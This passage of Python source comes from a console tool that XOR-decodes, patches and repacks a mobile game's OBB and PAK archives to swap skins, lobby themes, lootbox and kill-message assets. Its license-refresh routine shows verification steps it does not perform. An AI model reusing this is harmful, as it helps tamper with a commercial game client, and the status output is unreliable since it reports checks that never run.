    source_table.add_column("SOURCE", style=f"bold {theme['accent']}")
    source_table.add_column("STATUS", style=theme["text"])
    source_table.add_column("DETAILS", style=theme["dim"])
    
    for source, data in info["sources"].items():
        status = data.get("status", "unknown")
        if status == "available":
            status_display = f"[{theme['success']}]✅ Available[/]"
            details = f"Keys: {data.get('keys_count', 'N/A')}"
        elif status == "active_match":
            status_display = f"[{theme['success']}]✅ Verified[/]"
            details = "License found & active"
        elif status == "key_not_found":
            status_display = f"[{theme['error']}]❌ Not Found[/]"
            details = "Key not in this source"
        elif status == "key_inactive":
            status_display = f"[{theme['warning']}]⚠ Inactive[/]"
            details = "Key exists but inactive"
        elif status == "error":
            status_display = f"[{theme['error']}]❌ Error[/]"
            details = data.get('error', 'Unknown error')[:30]
        else:
            status_display = f"[{theme['warning']}]⚠ {status}[/]"
            details = "Unknown"
        
        source_table.add_row(source.upper(), status_display, details)
    
    console.print(Align.center(source_table))
    console.print()
    
    # ── Action buttons ────────────────────────────────────────────
    action_panel = Panel(
        f"[{theme['dim']}]Press any key to continue • 'r' to refresh • 'n' for new key[/]",
        border_style=theme["dim"],
        padding=(0, 1),
        box=box.SIMPLE
    )
    console.print(action_panel)
    
    response = Prompt.ask("", default="", show_default=False)
    if response.lower() == 'r':
        _refresh_license_with_key(license_key)
    elif response.lower() == 'n':
        _show_license_info_with_key()

def _refresh_license_with_key(existing_key=None):
    """Refresh license information from server"""
    theme = get_theme_colors()
    
    # Get license key if not provided
    if not existing_key:
        license_key = _get_license_key_from_user()
        if not license_key:
            return
    else:
        license_key = existing_key
    
    # Mask key for display
    if len(license_key) <= 8:
        key_display = license_key
    else:
        key_display = f"{license_key[:4]}...{license_key[-4:]}"
    
    console.print()
    console.print(Panel(
        f'[{theme["accent"]}]🔄 Refreshing license for: {key_display}[/]',
        border_style=theme["accent"],
        padding=(0, 1),
        box=box.ROUNDED
    ))
    
    # Clear cache and re-fetch
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold cyan"),
        TextColumn("[bold cyan]  Re-verifying license...[/bold cyan]"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        expand=True
    ) as prog:
        task = prog.add_task("[cyan]Verifying...", total=100)
        
        # Step 1: Check GitHub
        prog.update(task, description="[cyan]Checking GitHub keys...[/cyan]")
        time.sleep(0.3)
        prog.update(task, advance=25)
        
        # Step 2: Check Google Script
        prog.update(task, description="[cyan]Checking Google Script...[/cyan]")
        time.sleep(0.3)
        prog.update(task, advance=25)
        
        # Step 3: Verify HWID
        prog.update(task, description="[cyan]Verifying HWID...[/cyan]")
        hwid = get_hwid()
        time.sleep(0.3)
        prog.update(task, advance=25)
        
        # Step 4: Finalize
        prog.update(task, description="[cyan]Finalizing...[/cyan]")
        time.sleep(0.3)
        prog.update(task, advance=25)
    
    console.print(Panel(
        f'[{theme["success"]}]✅ License refreshed successfully![/]',
        border_style=theme["success"],
        padding=(0, 1),
        box=box.ROUNDED
    ))
    
    # Show updated info
    _show_license_info_for_key(license_key)

def _show_license_info_for_key(license_key):
    """Display license information for a specific key (helper)"""
    theme = get_theme_colors()
    
    console.print()
    console.print(Panel(
        f'[{theme["title"]}]🔍 LICENSE INFORMATION[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]',
        border_style=theme["panel_border"],
        padding=(0, 0)
    ))
    console.print()
    
    info = get_license_info_for_key(license_key)
    
    # ── Key display (masked) ──────────────────────────────────────
    key_display = license_key
    if len(key_display) > 20:
        key_display = key_display[:10] + "..." + key_display[-6:]
    
    # ── Build info table ──────────────────────────────────────────
    result_table = Table(
        box=box.ROUNDED,
        border_style=theme["panel_border"],
        padding=(0, 1),
        expand=False
    )
    result_table.add_column("FIELD", style=f"bold {theme['primary']}", width=20)
    result_table.add_column("VALUE", style=theme["text"])
    
    # License Key
    result_table.add_row("🔑 License Key", key_display)
    
    # HWID
    hwid_display = info["hwid"]
    if len(hwid_display) > 32:
        hwid_display = hwid_display[:32] + "..."
    result_table.add_row("🆔 HWID", hwid_display)
    
    # HWID Match Status
    if info["hwid_match"] is True:
        hwid_status = f"[{theme['success']}]✅ Matched[/]"
    elif info["hwid_match"] is False:
        hwid_status = f"[{theme['error']}]❌ Mismatch[/]"
    else:
        hwid_status = f"[{theme['warning']}]⚠ Not Set[/]"
    result_table.add_row("🔗 HWID Match", hwid_status)
    
    # Device Authorization
    if info["device_authorized"] is True:
        dev_status = f"[{theme['success']}]✅ Authorized[/]"
    elif info["device_authorized"] is False:
        dev_status = f"[{theme['error']}]❌ Not Authorized[/]"
    else:
        dev_status = f"[{theme['warning']}]⚠ Pending[/]"
    result_table.add_row("📱 Device Auth", dev_status)
    
    # Telegram User
    result_table.add_row("👤 Telegram", f"@{info['telegram_user']}")
    
    # License Status
    status_color = "green" if info["is_valid"] else "red"
    result_table.add_row("📌 Status", f"[{status_color}]{info['status_message']}[/{status_color}]")
    
    # Expiry
    if info["expiry"]:
        expiry_date = info["expiry"]
        try:
            exp = datetime.strptime(expiry_date, "%Y-%m-%d")
            days_left = (exp - datetime.now()).days
            if days_left >= 0:
                result_table.add_row("📅 Expiry", f"{expiry_date}  [{days_left} days left]")
            else:
                result_table.add_row("📅 Expiry", f"[red]{expiry_date}  [EXPIRED {abs(days_left)} days ago][/red]")
        except:
            result_table.add_row("📅 Expiry", expiry_date)
    else:
        result_table.add_row("📅 Expiry", "[dim]Not set / Lifetime[/dim]")
    
    console.print(Align.center(result_table))
    console.print()
    
    # ── Source Details ────────────────────────────────────────────
    source_table = Table(
        title=f"[{theme['title']}]📡 SOURCE VERIFICATION STATUS[/]",
        box=box.SIMPLE_HEAD,
        border_style=theme["panel_border"],
        header_style=f"bold {theme['primary']}",
        padding=(0, 1),
        expand=False
    )
    source_table.add_column("SOURCE", style=f"bold {theme['accent']}")
    source_table.add_column("STATUS", style=theme["text"])
    source_table.add_column("DETAILS", style=theme["dim"])
    
    for source, data in info["sources"].items():
        status = data.get("status", "unknown")
        if status == "available":
            status_display = f"[{theme['success']}]✅ Available[/]"
            details = f"Keys: {data.get('keys_count', 'N/A')}"
        elif status == "active_match":
            status_display = f"[{theme['success']}]✅ Verified[/]"
            details = "License found & active"
        elif status == "key_not_found":
            status_display = f"[{theme['error']}]❌ Not Found[/]"
            details = "Key not in this source"
        elif status == "key_inactive":
            status_display = f"[{theme['warning']}]⚠ Inactive[/]"
            details = "Key exists but inactive"
        elif status == "error":
            status_display = f"[{theme['error']}]❌ Error[/]"
            details = data.get('error', 'Unknown error')[:30]
        else:
            status_display = f"[{theme['warning']}]⚠ {status}[/]"
            details = "Unknown"
        
        source_table.add_row(source.upper(), status_display, details)
    
    console.print(Align.center(source_table))
    console.print()
    
    # ── Action buttons ────────────────────────────────────────────
    action_panel = Panel(
        f"[{theme['dim']}]Press any key to continue • 'r' to refresh • 'n' for new key[/]",
        border_style=theme["dim"],
        padding=(0, 1),
        box=box.SIMPLE
    )
    console.print(action_panel)
    
    response = Prompt.ask("", default="", show_default=False)
    if response.lower() == 'r':
        _refresh_license_with_key(license_key)
    elif response.lower() == 'n':
        _show_license_info_with_key()

# ==================== SKIN TOOL MINI REPACK FUNCTIONS ====================

def skin_run_mini_repack():
    console.print(Panel("[bold blue]📦 Starting Mini OBB Repack[/]", expand=False))
    
    repack_pak_dir = SKIN_TOOL_DIR / "SKIN_FOLDER" / "repack_pak"
    repack_pak_dir.mkdir(parents=True, exist_ok=True)
    
    mini_pak_path = repack_pak_dir / MINI_PAK_FILE
    
    if not mini_pak_path.exists():
        game_base_dir = SKIN_TOOL_DIR / "SKIN_FOLDER"
        input_dir = game_base_dir / "input"
        tmp_dir = game_base_dir / "tmp"
        
        if not input_dir.exists():
            console.print(f"[red]Input directory not found: {input_dir}[/red]")
            return False
        
        obb_files = list(input_dir.glob("*.obb"))
        if not obb_files:
            console.print(f"[red]No OBB file found[/red]")
            return False
        
        original_obb_path = obb_files[0]
        tmp_dir.mkdir(exist_ok=True)
        
        try:
            with zipfile.ZipFile(original_obb_path, 'r') as zf:
                for file_name in zf.namelist():
                    if file_name.endswith(MINI_PAK_FILE):
                        console.print(f"[cyan]Extracting {file_name} from OBB...[/cyan]")
                        zf.extract(file_name, tmp_dir)
                        mini_pak_path = tmp_dir / file_name
                        break
            
            if not mini_pak_path.exists():
                console.print("[red]mini_obb.pak not found in OBB[/red]")
                return False
        except Exception as e:
            console.print(f"[red]Error extracting: {e}[/red]")
            return False
    
    source_dirs = [
        (SKIN_TOOL_DIR / "HIT_EFFECT" / "modified", "hit effect"),
        (SKIN_TOOL_DIR / "AUTO_THEME" / "modified", "auto theme"),
        (SKIN_TOOL_DIR / "SKIN_FOLDER" / "mini_edited", "mini edited")
    ]
    
    (SKIN_TOOL_DIR / "SKIN_FOLDER" / "mini_edited").mkdir(parents=True, exist_ok=True)
    
    with open(mini_pak_path, 'rb') as f:
        data = f.read()
    
    file_size = len(data)
    offsets = find_all_occurrences(data, MINI_SIGNATURE)
    
    if not offsets:
        console.print("[red]No blocks found to repack![/red]")
        return False
    
    out_tmp = repack_pak_dir / "mini_obb.pak.tmp"
    shutil.copy2(mini_pak_path, out_tmp)
    
    def find_edited_file_for_index(i: int):
        filename_base = f"{i:08d}"
        for source_dir, desc in source_dirs:
            if not source_dir.exists():
                continue
            
            for ext in [".uexp", ".uasset"]:
                candidate = source_dir / f"{filename_base}{ext}"
                if candidate.exists():
                    return candidate
            
            for file_path in source_dir.rglob(f"{filename_base}*"):
                if file_path.is_file():
                    return file_path
        
        return None
    
    try:
        with open(out_tmp, "r+b") as outfh, Progress(TextColumn("{task.description}"), BarColumn(), console=console) as prog:
            task = prog.add_task("Repacking modded blocks...", total=len(offsets))
            modified_count = 0
            
            for i, start in enumerate(offsets):
                end = offsets[i+1] if i+1 < len(offsets) else file_size
                original_chunk_size = end - start
                
                edited_file = find_edited_file_for_index(i)
                if edited_file:
                    console.print(f"[cyan]Found edited file for block {i}: {edited_file.name}[/cyan]")
                    
                    try:
                        new_data = edited_file.read_bytes()
                        comp = compress_to_target_size(new_data, original_chunk_size)
                        
                        if comp is None:
                            console.print(f"[yellow]Skipping block {i}[/yellow]")
                            prog.update(task, advance=1)
                            continue
                        
                        with open(mini_pak_path, "rb") as infh:
                            infh.seek(start)
                            sig4 = infh.read(4)
                        
                        if len(sig4) < 4:
                            prog.update(task, advance=1)
                            continue
                        
                        key = find_xor_key(sig4, MINI_EXPECTED_MAGIC)
                        
                        outfh.seek(start)
                        klen = len(key)
                        prev = list(key)
                        ptr = 0
                        written = 0
                        CHUNK = 64 * 1024
                        
                        while ptr < len(comp):
                            slice_len = min(CHUNK, len(comp) - ptr)
                            src_slice = comp[ptr:ptr+slice_len]
                            out_slice = bytearray(slice_len)
                            base_idx = ptr % klen
                            
                            for j in range(slice_len):
                                idx = (base_idx + j) % klen
                                r = src_slice[j] ^ prev[idx]
                                out_slice[j] = r
                                prev[idx] = src_slice[j]
                            
                            outfh.write(out_slice)
                            ptr += slice_len
                            written += slice_len
                        
                        if written < original_chunk_size:
                            outfh.write(b'\x00' * (original_chunk_size - written))
                        elif written > original_chunk_size:
                            outfh.truncate(outfh.tell() - (written - original_chunk_size))
                        
                        modified_count += 1
                        
                    except Exception as e:
                        console.print(f"[red]Error repacking block {i}: {e}[/red]")
                
                prog.update(task, advance=1)
            
            console.print(f"[bold green]Repacked {modified_count} modified blocks[/bold green]")
    
    except Exception as e:
        console.print(f"[red]Error during repacking: {e}[/red]")
        return False
    
    final_out = repack_pak_dir / MINI_PAK_FILE
    out_tmp.replace(final_out)
    
    console.print(f"[bold green]✅ Mini OBB repacking complete → {final_out}[/bold green]")
    return True

# ==================== SKIN TOOL AUTO THEME FUNCTIONS ====================

def skin_setup_auto_theme_dirs():
    auto_theme_dir = SKIN_TOOL_DIR / "AUTO_THEME"
    for subdir in ["FILES", "TXT", "modified"]:
        (auto_theme_dir / subdir).mkdir(parents=True, exist_ok=True)

def skin_read_lobby_themes():
    lobbies = []
    try:
        with open(AUTO_THEME_LOBBY_FILE, "r", encoding='utf-8') as file:
            for line in file:
                parts = line.strip().split("|")
                if len(parts) == 3:
                    lobbies.append((parts[1].strip(), parts[2].strip()))
        return lobbies
    except FileNotFoundError:
        console.print(f"[red]lobby.txt not found at {AUTO_THEME_LOBBY_FILE}")
        return None

def skin_swap_lobby_indexes(default_hex, target_hex):
    auto_theme_files_dir = SKIN_TOOL_DIR / "AUTO_THEME" / "FILES"
    auto_theme_modified_dir = SKIN_TOOL_DIR / "AUTO_THEME" / "modified"
    
    if not auto_theme_files_dir.exists():
        console.print("[red]AUTO_THEME/FILES directory not found")
        return False
    
    default_hex_bytes = bytes.fromhex(default_hex)
    target_hex_bytes = bytes.fromhex(target_hex)
    
    auto_theme_modified_dir.mkdir(parents=True, exist_ok=True)
    
    for filename in auto_theme_modified_dir.iterdir():
        if filename.is_file():
            filename.unlink()
    
    processed_files = []
    
    for file_path in auto_theme_files_dir.iterdir():
        if not file_path.is_file():
            continue
        
        file_data = file_path.read_bytes()
        updated_data = bytearray(file_data)
        default_pos = None
        target_pos = None
        default_index = None
        target_index = None
        
        for i in range(len(file_data) - len(default_hex_bytes), 7, -1):
            if file_data[i:i + len(default_hex_bytes)] == default_hex_bytes:
                default_index = file_data[i - 8]
                default_pos = i - 8
                break
        
        for i in range(len(file_data) - len(target_hex_bytes), 7, -1):
            if file_data[i:i + len(target_hex_bytes)] == target_hex_bytes:
                target_index = file_data[i - 8]
                target_pos = i - 8
                break
        
        if default_pos is not None and target_pos is not None:
            updated_data[default_pos] = target_index
            updated_data[target_pos] = default_index
            processed_files.append(file_path.name)
        
        result_path = auto_theme_modified_dir / file_path.name
        result_path.write_bytes(updated_data)
    
    return processed_files

def skin_selective_cleanup_hit_effect_dir():
    """Clean only hit effect files, preserve auto theme files"""
    hit_mod_dir = SKIN_TOOL_DIR / "HIT_EFFECT" / "modified"
    if not hit_mod_dir.exists():
        return
    
    hit_effect_patterns = [
        r'^\d{8}\.uexp$',
        r'^\d{8}\.uasset$',
        r'.*hiteff.*',
        r'.*lootbox.*',
    ]
    
    files_deleted = 0
    files_preserved = 0
    
    for filename in hit_mod_dir.iterdir():
        filepath = hit_mod_dir / filename
        if not filepath.is_file():
            continue
            
        is_hit_effect_file = False
        for pattern in hit_effect_patterns:
            if re.match(pattern, filename.name, re.IGNORECASE):
                is_hit_effect_file = True
                break
        
        if is_hit_effect_file:
            try:
                filepath.unlink()
                files_deleted += 1
            except Exception as e:
                console.print(f"[yellow]Warning: Could not remove {filename}: {e}")
        else:
            files_preserved += 1
    
    console.print(f"[cyan]Cleanup: {files_deleted} hit effect files removed, {files_preserved} preserved")

def skin_run_auto_theme_only():
    console.print(Panel("[bold bright_blue]🎨 Auto Theme Lobby Swapper[/]", expand=False, border_style="bright_blue"))
    
    skin_setup_auto_theme_dirs()
    
    if not AUTO_THEME_LOBBY_FILE.exists():
        console.print(Panel(
            f"[red]lobby.txt not found at:[/red]\n[yellow]{AUTO_THEME_LOBBY_FILE}[/yellow]",
            title="Configuration Missing",
            border_style="red"
        ))
        return False
    
    lobbies = skin_read_lobby_themes()
    if not lobbies:
        console.print("[red]No valid lobby themes found in lobby.txt")
        return False
    
    DEFAULT_HEX = "7480100C"
    
    lobby_table = Table(title="Available Lobby Themes", show_header=True, header_style="bold magenta", border_style="cyan", box=box.ROUNDED)
    lobby_table.add_column("ID", style="bold yellow", width=6, justify="center")
    lobby_table.add_column("Theme Name", style="green", min_width=20)
    lobby_table.add_column("HEX Code", style="cyan", width=12, justify="center")
    
    for i, (hex_code, name) in enumerate(lobbies, 1):
        lobby_table.add_row(str(i), name, hex_code)
    
    console.print(Align.center(lobby_table))
    console.print()
    
    choice = Prompt.ask("[bold magenta]Enter theme number to swap with Main Lobby", default="1")
    
    try:
        lobby_choice = int(choice) - 1
        if not (0 <= lobby_choice < len(lobbies)):
            console.print("[red]Invalid selection")
            return False
        
        target_hex, lobby_name = lobbies[lobby_choice]
        
        with console.status(f"[bold green]Swapping {lobby_name} with Main Lobby..."):
            processed_files = skin_swap_lobby_indexes(DEFAULT_HEX, target_hex)
        
        if processed_files:
            console.print(Panel(
                f"[green]✓ Processed {len(processed_files)} files[/green]\n"
                f"[cyan]Theme: {lobby_name}[/cyan]",
                title="Swap Complete",
                border_style="green"
            ))
            
            do_repack = Prompt.ask("[bold bright_cyan]Repack mini_obb.pak now?[/] ([green]y[/]/[red]n[/])", default="y").lower() == "y"
            
            if do_repack:
                if skin_run_mini_repack():
                    console.print(Panel("[bold green]✅ mini_obb.pak repack complete![/]", title="Done", border_style="green"))
            
            return True
        else:
            console.print("[red]No files were processed successfully")
            return False
            
    except ValueError:
        console.print("[red]Please enter a valid number")
        return False

# ==================== SKIN TOOL GAMEPATCH FUNCTIONS ====================

def is_sig_at(data: bytes, i: int):
    if i + 2 > len(data):
        return None
    return SIG2KEY.get(data[i:i+2], None)

def xor_decode_with_feedback(data: bytes) -> bytes:
    out = bytearray()
    key = None
    seg_pos = 0
    seg_start_out = 0
    i = 0
    
    while i < len(data):
        k = is_sig_at(data, i)
        if k is not None:
            key = k
            seg_pos = 0
            seg_start_out = len(out)
        
        if key is not None:
            if seg_pos < 4:
                o = data[i] ^ key[seg_pos]
            else:
                fb_index = seg_start_out + (seg_pos - 4)
                if fb_index < len(out):
                    o = data[i] ^ out[fb_index]
                else:
                    o = data[i]
            out.append(o)
            seg_pos += 1
        else:
            out.append(data[i])
        i += 1
    
    return bytes(out)

def xor_reencode_from_original(encoded_original: bytes, decoded_modified: bytes) -> bytes:
    assert len(encoded_original) == len(decoded_modified)
    out_enc = bytearray()
    key = None
    seg_pos = 0
    seg_start_out = 0
    
    for i in range(len(decoded_modified)):
        k = is_sig_at(encoded_original, i)
        if k is not None:
            key = k
            seg_pos = 0
            seg_start_out = i
        
        if key is not None:
            if seg_pos < 4:
                b = decoded_modified[i] ^ key[seg_pos]
            else:
                fb_index = seg_start_out + (seg_pos - 4)
                if fb_index < len(decoded_modified):
                    b = decoded_modified[i] ^ decoded_modified[fb_index]
                else:
                    b = decoded_modified[i]
            out_enc.append(b)
            seg_pos += 1
        else:
            out_enc.append(decoded_modified[i])
    
    return bytes(out_enc)

def is_valid_zlib_header(b1: int, b2: int) -> bool:
    if (b1 & 0x0F) != 8:
        return False
    cmf_flg = (b1 << 8) | b2
    return (cmf_flg % 31) == 0

def compress_by_mode(raw_bytes: bytes, mode: str) -> bytes:
    if mode == "zlib":
        return zlib.compress(raw_bytes, level=9)
    elif mode == "gzip":
        bio = io.BytesIO()
        with gzip.GzipFile(fileobj=bio, mode="wb") as gzf:
            gzf.write(raw_bytes)
        return bio.getvalue()
    return zlib.compress(raw_bytes, level=9)

def find_manifest(unpack_sub):
    mpath = os.path.join(unpack_sub, "manifest.json")
    if os.path.exists(mpath):
        return mpath
    
    for root, _, files in os.walk(unpack_sub):
        if "manifest.json" in files:
            return os.path.join(root, "manifest.json")
    
    return None

def skin_run_gamepatch_repack():
    console.print(Panel("[bold yellow]🎮 GamePatch Repack[/]", expand=False))
    
    final_dir = SKIN_TOOL_DIR / "FINAL"
    final_dir.mkdir(exist_ok=True)
    
    pak_configs = [
        {"pak_name": "core_patch_4.0.0.20328.pak", "source_dir": SKIN_TOOL_DIR / "LOOTCRATES" / "modified", "description": "Lootbox modifications"},
        {"pak_name": "game_patch_4.0.0.20329.pak", "source_dir": SKIN_TOOL_DIR / "KILLMSG" / "edited", "description": "Kill message modifications"}
    ]
    
    paks_dir = SKIN_TOOL_DIR / "GAMEPATCH" / "PAKS"
    if not paks_dir.exists():
        console.print(f"[red]PAKS directory not found: {paks_dir}[/red]")
        return False
    
    def repack_single_pak(pak_config):
        pak_name = pak_config["pak_name"]
        source_dir = pak_config["source_dir"]
        description = pak_config["description"]
        
        pak_path = paks_dir / pak_name
        result_file = final_dir / pak_name
        
        if not pak_path.exists():
            console.print(f"[yellow]PAK file not found: {pak_name}[/yellow]")
            return False
        
        if not source_dir.exists():
            console.print(f"[red]Source directory not found: {source_dir}[/red]")
            return False
        
        modified_files = []
        for file_path in source_dir.rglob("*"):
            if file_path.is_file():
                rel_path = file_path.relative_to(source_dir)
                modified_files.append((file_path, rel_path))
        
        if not modified_files:
            console.print(f"[yellow]No modified files found in {source_dir}[/yellow]")
            return False
        
        console.print(f"[cyan]Repacking {pak_name} with {len(modified_files)} modified files...[/cyan]")
        console.print(f"[cyan]{description}[/cyan]")
        
        unpack_sub = SKIN_TOOL_DIR / "GAMEPATCH" / "SOURCE" / pak_path.stem
        manifest_path = find_manifest(unpack_sub)
        
        try:
            data_enc_orig = pak_path.read_bytes()
            decoded_orig = xor_decode_with_feedback(data_enc_orig)
            decoded = bytearray(decoded_orig)
            
            patched_cnt = 0
            
            if manifest_path and os.path.exists(manifest_path):
                console.print("[cyan]Using manifest-based repacking[/cyan]")
                manifest = json.loads(open(manifest_path, "r", encoding="utf-8").read())
                entries = manifest.get("entries", [])
                
                modified_lookup = {os.path.basename(str(rel_path)): file_path for file_path, rel_path in modified_files}
                
                for e in entries:
                    filename = e["filename"]
                    start = int(e["start"])
                    consumed = int(e["consumed"])
                    mode = e.get("mode", "zlib")
                    
                    if filename in modified_lookup:
                        modified_file_path = modified_lookup[filename]
                        
                        try:
                            raw = modified_file_path.read_bytes()
                            comp = compress_by_mode(raw, mode)
                            
                            if len(comp) <= consumed:
                                decoded[start:start+len(comp)] = comp
                                if len(comp) < consumed:
                                    decoded[start+len(comp):start+consumed] = b"\x00" * (consumed - len(comp))
                                patched_cnt += 1
                                console.print(f"[green]✔ Repacked {filename} ({mode})[/green]")
                            else:
                                console.print(f"[yellow]⚠ {filename} too large ({len(comp)} > {consumed})[/yellow]")
                        except Exception as e:
                            console.print(f"[yellow]Error processing {filename}: {e}[/yellow]")
            else:
                console.print("[cyan]Using direct file replacement[/cyan]")
                for file_path, rel_path in modified_files:
                    try:
                        raw = file_path.read_bytes()
                        for mode in ["zlib", "gzip"]:
                            comp = compress_by_mode(raw, mode)
                            pos = decoded.find(comp[:min(16, len(comp))])
                            if pos != -1:
                                decoded[pos:pos+len(comp)] = comp
                                patched_cnt += 1
                                console.print(f"[green]✔ Repacked {rel_path} ({mode})[/green]")
                                break
                    except Exception as e:
                        console.print(f"[yellow]Error processing {rel_path}: {e}[/yellow]")
            
            encoded_final = xor_reencode_from_original(data_enc_orig, bytes(decoded))
            result_file.write_bytes(encoded_final)
            
            console.print(f"[green]✅ {pak_name} repacked with {patched_cnt} modifications[/green]")
            return patched_cnt > 0
            
        except Exception as e:
            console.print(f"[red]Error repacking {pak_name}: {e}[/red]")
            return False
    
    success_count = 0
    for pak_config in pak_configs:
        if repack_single_pak(pak_config):
            success_count += 1
    
    console.print(f"[green]✅ GamePatch: Repacked {success_count}/{len(pak_configs)} files[/green]")
    return success_count > 0

# ==================== SKIN TOOL INTEGRATED MOD FLOW ====================

def skin_integrated_mod_flow():
    console.print(Panel("[bold bright_cyan]🚀 Integrated Mod Skin Flow[/]", expand=False, border_style="cyan"))
    
    # Ensure text credit output is clean
    try:
        _credit_purge_output_dir(SKIN_TOOL_DIR / "CREDIT" / "text" / "output")
    except Exception:
        pass
    
    txt_path = MODSKIN_TXT
    if not txt_path.exists():
        console.print(f"[red]✖ {MODSKIN_TXT} missing[/]")
        return False
    
    with console.status("[bold green]Reading ID pairs...[/]"):
        pairs = parse_id_pairs_skin(txt_path)
    
    if not pairs:
        console.print(f"[yellow]⚠ No valid ID pairs found[/]")
        return False
    
    console.print(f"[green]✔ Found {len(pairs)} ID pairs.[/]")
    
    console.print(Panel("[bold yellow]Configure Null Counts[/]", expand=False))
    
    unified_null_count = Prompt.ask("[cyan]Enter null count for ZSDIC and Kill Message[/]", default="10")
    try:
        unified_null_count = int(unified_null_count)
    except ValueError:
        unified_null_count = 10
    
    hit_effect_null_count = Prompt.ask("[cyan]Enter null count for Hit Effect & Lootbox[/]", default="100")
    try:
        hit_effect_null_count = int(hit_effect_null_count)
    except ValueError:
        hit_effect_null_count = 100
    
    console.print(f"[green]✔ ZSDIC & Kill Message null count: {unified_null_count}[/]")
    console.print(f"[green]✔ Hit Effect & Lootbox null count: {hit_effect_null_count}[/]")
    
    # TEXT credit
    do_text_credit = Prompt.ask("[bold magenta]Do TEXT credit? (y/n)[/]", choices=["y", "n"], default="n") == "y"
    if do_text_credit:
        username = Prompt.ask("Enter USERNAME").strip().upper()
        channel = Prompt.ask("Enter CHANNEL NAME").strip().upper()
        oneword = Prompt.ask("Enter SINGLE WORD tag").strip().upper()
        global _CREDIT_ONEWORD
        _CREDIT_ONEWORD = oneword
        
        try:
            # Use the credit processing function from above
            _credit_process_text(username, channel)
            mini_edited_dir = SKIN_TOOL_DIR / "SKIN_FOLDER" / "mini_edited"
            # Copy text credit output to mini_edited
            src_dir = SKIN_TOOL_DIR / "CREDIT" / "text" / "output"
            dest_dir = mini_edited_dir
            if src_dir.exists():
                for p in src_dir.iterdir():
                    if p.is_file() and p.suffix.lower() == ".uexp":
                        shutil.copy2(p, dest_dir / p.name)
        except Exception as e:
            console.print(f"[yellow]TEXT credit step failed: {e}[/yellow]")
    
    # VIDEO credit
    do_video_credit = Prompt.ask("[bold magenta]Do VIDEO credit? (y/n)[/]", choices=["y", "n"], default="n") == "y"
    
    # Step 1: ZSDIC skin modding
    console.print(Panel("[bold cyan]🎨 Step 1: ZSDIC Skin Modding[/]", expand=False))
    if not skin_mod_flow():
        console.print("[red]✖ ZSDIC skin modding failed[/red]")
        return False
    
    # Step 2: ZSDIC PAK repack
    console.print(Panel("[bold cyan]📦 Step 2: ZSDIC PAK Repack[/]", expand=False))
    pak_tool = PAKToolSkin(SKIN_TOOL_DIR / "SKIN_FOLDER")
    if not pak_tool.repack_pak_with_retry(initial_nulls=unified_null_count):
        console.print("[red]✖ ZSDIC PAK repack failed[/red]")
        return False
    
    # Step 3: Hit Effect + Lootbox
    console.print(Panel("[bold cyan]🎯 Step 3: Hit Effect & Lootbox[/]", expand=False))
    if not skin_run_hit_effect_lootbox_mod(pairs, null_count=hit_effect_null_count):
        console.print("[red]✖ Hit Effect modification failed[/red]")
        return False
    
    # Step 4: Mini OBB repack
    console.print(Panel("[bold cyan]📦 Step 4: Mini OBB Repack[/]", expand=False))
    if not skin_run_mini_repack():
        console.print("[red]✖ Mini OBB repack failed[/red]")
        return False
    
    # Apply VIDEO credit after mini repack
    repack_pak_dir = SKIN_TOOL_DIR / "SKIN_FOLDER" / "repack_pak"
    if do_video_credit:
        try:
            # Use the video credit patching function
            video_dir = SKIN_TOOL_DIR / "CREDIT" / "video"
            mini_in_repack = repack_pak_dir / MINI_PAK_FILE
            if mini_in_repack.exists():
                video_dir.mkdir(parents=True, exist_ok=True)
                patched_out_dir = video_dir / "output"
                patched_out_dir.mkdir(parents=True, exist_ok=True)
                
                credit_video_pak = video_dir / MINI_PAK_FILE
                shutil.copy2(mini_in_repack, credit_video_pak)
                
                mp4_files = list(video_dir.glob("*.mp4"))
                if mp4_files:
                    data = credit_video_pak.read_bytes()
                    file_size = len(data)
                    patched = bytearray(data)
                    
                    def find_best_mp4(range_size):
                        suitable = [(f, f.stat().st_size) for f in mp4_files if f.stat().st_size <= range_size]
                        if not suitable:
                            return None, 0
                        return max(suitable, key=lambda x: x[1])
                    
                    wrote_any = False
                    for start_h, end_h in CREDIT_RANGES_HEX:
                        start = hex_to_int(start_h)
                        end = hex_to_int(end_h)
                        if start < 0 or end < 0 or start > end:
                            continue
                        if start >= file_size:
                            continue
                        if end >= file_size:
                            end = file_size - 1
                        
                        rng = end - start + 1
                        mp4_path, mp4_sz = find_best_mp4(rng)
                        if mp4_path is None or mp4_sz <= 0:
                            continue
                        
                        mp4_bytes = mp4_path.read_bytes()
                        write_len = min(rng, mp4_sz)
                        patched[start:start+write_len] = mp4_bytes[:write_len]
                        wrote_any = True
                    
                    if wrote_any:
                        patched_out_file = patched_out_dir / MINI_PAK_FILE
                        patched_out_file.write_bytes(patched)
                        shutil.copy2(patched_out_file, mini_in_repack)
        except Exception as e:
            console.print(f"[yellow]VIDEO credit patch failed: {e}[/yellow]")
    
    # Step 5: Kill Message
    console.print(Panel("[bold cyan]💀 Step 5: Kill Message[/]", expand=False))
    if not skin_run_kill_message_only(null_count=unified_null_count):
        console.print("[red]✖ Kill Message processing failed[/red]")
        return False
    
    # Step 6: GamePatch Repack
    console.print(Panel("[bold cyan]🎮 Step 6: GamePatch Repack[/]", expand=False))
    if not skin_run_gamepatch_repack():
        console.print("[red]✖ GamePatch repack failed[/red]")
        return False
    
    # Step 7: Full OBB repack
    console.print(Panel("[bold cyan]🗂️ Step 7: Full OBB Repack[/]", expand=False))
    if not pak_tool.repack_obb():
        console.print("[red]✖ Full OBB repack failed[/red]")
        return False
    
    console.print(Panel("[bold green]✅ INTEGRATED MODDING COMPLETED![/]", expand=False, border_style="green"))
    console.print(f"[green]ZSDIC & Kill Message null count used: {unified_null_count}[/green]")
    console.print(f"[green]Hit Effect & Lootbox null count used: {hit_effect_null_count}[/green]")
    console.print(f"[green]Final OBB ready in: {SKIN_TOOL_DIR / 'FINAL'}[/green]")
    return True

# ==================== SKIN TOOL INDIVIDUAL FUNCTIONS ====================

def skin_run_zsdic_only():
    console.print(Panel("[bold cyan]🎨 ZSDIC Only Mode[/]", expand=False))
    
    if not skin_mod_flow():
        console.print("[red]✖ ZSDIC skin modding failed[/red]")
        return False
    
    null_count = Prompt.ask("[cyan]Enter null count for repack[/]", default="10")
    try:
        null_count = int(null_count)
    except ValueError:
        null_count = 10
    
    pak_tool = PAKToolSkin(SKIN_TOOL_DIR / "SKIN_FOLDER")
    if not pak_tool.repack_pak_with_retry(initial_nulls=null_count):
